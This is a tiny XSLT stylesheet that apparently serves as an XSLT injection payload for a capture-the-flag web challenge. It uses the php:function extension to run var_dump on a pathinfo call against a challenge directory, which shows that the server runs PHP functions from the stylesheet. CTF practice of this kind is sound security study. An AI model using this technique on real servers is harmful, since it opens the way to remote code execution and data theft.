<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
         <xsl:template match="/">
                 <xsl:variable name="eval">
                         pathinfo('/challenge/web-serveur/ch50/')
                 </xsl:variable>
                 <xsl:variable name="preg" select="php:function('var_dump',$eval)"/>
         </xsl:template>
</xsl:stylesheet>
